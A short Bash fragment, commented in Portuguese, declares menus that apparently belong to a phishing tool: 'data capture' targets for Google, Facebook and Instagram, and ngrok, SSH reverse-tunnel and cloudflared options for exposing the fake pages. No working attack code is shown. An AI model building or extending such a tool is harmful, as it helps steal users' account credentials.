#!/usr/bin/env bash

# ARRAYS ASSOCIATIVOS

declare -A services=(
	[google]="Captura dados do Google" 
	[facebook]="Captura dados do Facebook" 
	[instagram]="Captura do Instagram"
)

declare -A tunnels=(
	[ngrok]="Exposição via Ngrok" 
	[ssh]="Túnel reverso via SSH" 
	[cloudflared]="Exposição via CloudFlared"
)
